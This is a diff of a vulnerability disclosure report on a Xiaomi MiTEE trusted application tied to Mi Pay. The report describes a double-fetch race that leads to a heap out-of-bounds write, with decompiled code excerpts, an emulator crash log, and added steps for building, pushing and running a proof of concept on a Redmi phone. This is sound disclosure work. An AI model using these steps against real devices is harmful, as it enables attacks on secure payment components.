@@ -1,5 +1,5 @@
 
-We found a bug of TA (UUID: 88ce8e6b-8646-4092-bb78faf5b55ff4df) of MiTEE. It can be either an out-of-bound bug or a heap overflow. The root cause of this bug is double fetches to the memory shared between normal world and TEE environment.
+We found a bug of TA (UUID: 88ce8e6b-8646-4092-bb78faf5b55ff4df) of MiTEE. It can be either an out-of-bound bug or a heap overflow. The root cause of this bug is double fetches to the memory shared between normal world and TEE environment. An attacker can easily manipulate this shared memory from normal world to influence the behavior of the TA in secure world.
 
 Importantly, this ta is highly connected to Mi Pay.
 
@@ -13,6 +13,7 @@ The sha1 of the TA is `c3664eadd490bcb0ede5e9a98f640b86b8119720`
 ## Detailed Vulnerability Analysis
 
 The vulnerable execution path starts from `TA_InvokeCommandEntryPoint`. It is the main command handler of a Trusted Application and can be invoked when the normal world sends a command to the TA. All the parameters can be easily controlled by attackers in normal world.
+
 
 ```C
 // the definition of the method, TA_InvokeCommandEntryPoint
@@ -135,7 +136,7 @@ In the end, `allocated_buffer__ptr` becomes a minimally sized heap chunk. Conseq
 22        goto LAB_0012f15c;
 23      }
 24      // ...
-25      /* crash, first fetch used for memmove */
+25      /* crash, first-fetched value used for memmove() */
 26      memmove(allocated_buffer__ptr,lVar10 + -0x68,0x10);   
 27      memmove((long)allocated_buffer__ptr + 0x10,lVar10 + -0x74,4);
 28      lVar1 = (long)allocated_buffer__ptr + 0x14;
@@ -148,85 +149,7 @@ To sum up, in the race window between the two fetches, the attacker can make the
 
 
 
-## Screenshots for Validity
-
-
-
-```C
-[=]     printf: [Mlipay:INFO][TA_CreateEntryPoint:15]==func enter==
-[=]     printf: [Mlipay:INFO][TA_CreateEntryPoint:21]==func exit==
-[=]     printf: [Mlipay:INFO][TA_OpenSessionEntryPoint:30]==func enter==
-[=]     printf: [Mlipay:INFO][TA_OpenSessionEntryPoint:31]==func exit==
-[=]     [TA_InvokeCommandEntryPoint] start @0x555555578ae8
-[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
-[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:54]cmd 0000f003
-[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:97]fp_vendor: 00000001, cmd_id: 0000f003
-[=]     TEE_Malloc: allocated 0x0 at 0xaaaaa020
-[=]     memmove 0x10 from 0xf0fe58 to 0xaaaaa020
-[x]     =================[lr: 0x5555555831c0] [memmove] out-of-bound write on address 0xaaaaa020, size 0x10!!
-[x]     CPU Context:
-[x]     x0      : 0xaaaaa020
-[x]     x1      : 0xf0fe58
-[x]     x2      : 0x10
-[x]     x3      : 0x40
-[x]     x4      : 0x61
-[x]     x5      : 0x1
-[x]     x6      : 0xf003
-[x]     x7      : 0x400
-[x]     x8      : 0xf0fe78
-[x]     x9      : 0x211
-[x]     x10     : 0x555555578d30
-[x]     x11     : 0x27
-[x]     x12     : 0x0
-[x]     x13     : 0x0
-[x]     x14     : 0x0
-[x]     x15     : 0x0
-[x]     x16     : 0x5555555cd560
-[x]     x17     : 0x99999088
-[x]     x18     : 0x0
-[x]     x19     : 0xaaaaa020
-[x]     x20     : 0xf0ffe8
-[x]     x21     : 0x1bbbbdfb4
-[x]     x22     : 0x0
-[x]     x23     : 0xbbbbe00c
-[x]     x24     : 0xf0fe58
-[x]     x25     : 0xeee008
-[x]     x26     : 0xf0fec0
-[x]     x27     : 0xf0fe40
-[x]     x28     : 0xf0feb8
-[x]     x29     : 0x8000002ddd40
-[x]     x30     : 0x5555555831c0
-[x]     sp      : 0x8000002ddce0
-[x]     pc      : 0xdeadbeef
-[x]     lr      : 0x5555555831c0
-...
-[x]     PC = 0x00000000deadbeef (unreachable)
-
-[x]     Memory map:
-[x]     Start            End              Perm    Label                                    Image
-[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls            
-[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack   
-[x]     00000099999000 - 0000009999a000   rwx     dl_resolve               
-[x]     000000aaaaa000 - 000000aaaab000   rw-     malloc_chunk             
-[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id               
-[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context          
-[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params               
-[x]     000000bbbbe000 - 000000bbbc0000   rw-     shared_memory_0          
-[x]     000000bbbc0000 - 000000bbbc2000   rw-     shared_memory_1          
-[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]               
-[x]     00555555554000 - 00555555578000   r--     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
-[x]     00555555578000 - 005555555ca000   r-x     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
-[x]     005555555ca000 - 005555555d9000   rw-     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
-[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffffffde000 - 008000002de000   rwx     [stack]                  
-
-```
-
-
-
-### Source code of the POC
+## Source code of the POC
 
 ```C
 #include <stdio.h>
@@ -420,13 +343,118 @@ For reference, the dependent files for the PoC are attached here.
 - `tee.h`: Open-sourced in the OPTEE repo
 - `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
 - `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.
+- `Makefile`: Helps to generate and push specific poc binary to the phone
 
 
 
-### Vulnerability Reproduction
+## Vulnerability Reproduction
 
-1. preacquisition
-2. interaction
-3. clip
+We reproduced the poc on the Redmi Note 13 5G (OS Version: 1.0.18.0.UNQEUXM)
 
-#TODO
+
+1. Compile the poc:
+
+```bash
+ANDROID_NDK=$(path to android ndk) make phone
+```
+
+Upload the generate `./poc` executable to `/vendor/bin`. (On the phone we used a magisk plugin for this, but on a developer phone it should be possible to make `/vendor` writable)
+
+2. Then run the poc: 
+   
+```
+/vendor/bin/poc
+```
+
+The poc triggers the out-of-bound write and causes the TA to crash.
+The poc prints the return code and error origin which will be, indicating the TA crashed.
+
+```
+TEEC_Result: ffff3024  // TEE_ERROR_TARGET_DEAD
+origin: err_origin: 3 // TEEC_ORIGIN_TEE
+```
+
+
+
+### Screenshots for Validity
+
+![screenshots](pics/image.png)
+
+More detailed can be seen in our customized emulation mode with address sanitizer.
+
+```C
+[=]     printf: [Mlipay:INFO][TA_CreateEntryPoint:15]==func enter==
+[=]     printf: [Mlipay:INFO][TA_CreateEntryPoint:21]==func exit==
+[=]     printf: [Mlipay:INFO][TA_OpenSessionEntryPoint:30]==func enter==
+[=]     printf: [Mlipay:INFO][TA_OpenSessionEntryPoint:31]==func exit==
+[=]     [TA_InvokeCommandEntryPoint] start @0x555555578ae8
+[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
+[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:54]cmd 0000f003
+[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:97]fp_vendor: 00000001, cmd_id: 0000f003
+[=]     TEE_Malloc: allocated 0x0 at 0xaaaaa020
+[=]     memmove 0x10 from 0xf0fe58 to 0xaaaaa020
+[x]     =================[lr: 0x5555555831c0] [memmove] out-of-bound write on address 0xaaaaa020, size 0x10!!
+[x]     CPU Context:
+[x]     x0      : 0xaaaaa020
+[x]     x1      : 0xf0fe58
+[x]     x2      : 0x10
+[x]     x3      : 0x40
+[x]     x4      : 0x61
+[x]     x5      : 0x1
+[x]     x6      : 0xf003
+[x]     x7      : 0x400
+[x]     x8      : 0xf0fe78
+[x]     x9      : 0x211
+[x]     x10     : 0x555555578d30
+[x]     x11     : 0x27
+[x]     x12     : 0x0
+[x]     x13     : 0x0
+[x]     x14     : 0x0
+[x]     x15     : 0x0
+[x]     x16     : 0x5555555cd560
+[x]     x17     : 0x99999088
+[x]     x18     : 0x0
+[x]     x19     : 0xaaaaa020
+[x]     x20     : 0xf0ffe8
+[x]     x21     : 0x1bbbbdfb4
+[x]     x22     : 0x0
+[x]     x23     : 0xbbbbe00c
+[x]     x24     : 0xf0fe58
+[x]     x25     : 0xeee008
+[x]     x26     : 0xf0fec0
+[x]     x27     : 0xf0fe40
+[x]     x28     : 0xf0feb8
+[x]     x29     : 0x8000002ddd40
+[x]     x30     : 0x5555555831c0
+[x]     sp      : 0x8000002ddce0
+[x]     pc      : 0xdeadbeef
+[x]     lr      : 0x5555555831c0
+...
+[x]     PC = 0x00000000deadbeef (unreachable)
+
+[x]     Memory map:
+[x]     Start            End              Perm    Label                                    Image
+[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls            
+[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack   
+[x]     00000099999000 - 0000009999a000   rwx     dl_resolve               
+[x]     000000aaaaa000 - 000000aaaab000   rw-     malloc_chunk             
+[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id               
+[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context          
+[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params               
+[x]     000000bbbbe000 - 000000bbbc0000   rw-     shared_memory_0          
+[x]     000000bbbc0000 - 000000bbbc2000   rw-     shared_memory_1          
+[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]               
+[x]     00555555554000 - 00555555578000   r--     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
+[x]     00555555578000 - 005555555ca000   r-x     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
+[x]     005555555ca000 - 005555555d9000   rw-     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
+[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffffffde000 - 008000002de000   rwx     [stack]                  
+
+```
+
+
+### Impact 
+
+An attacker **running in the normal world** (either as root or in the context of a process able to communicate with the tee drivers like `/dev/tee0` or `/dev/teepriv0`) can trigger this bug. 
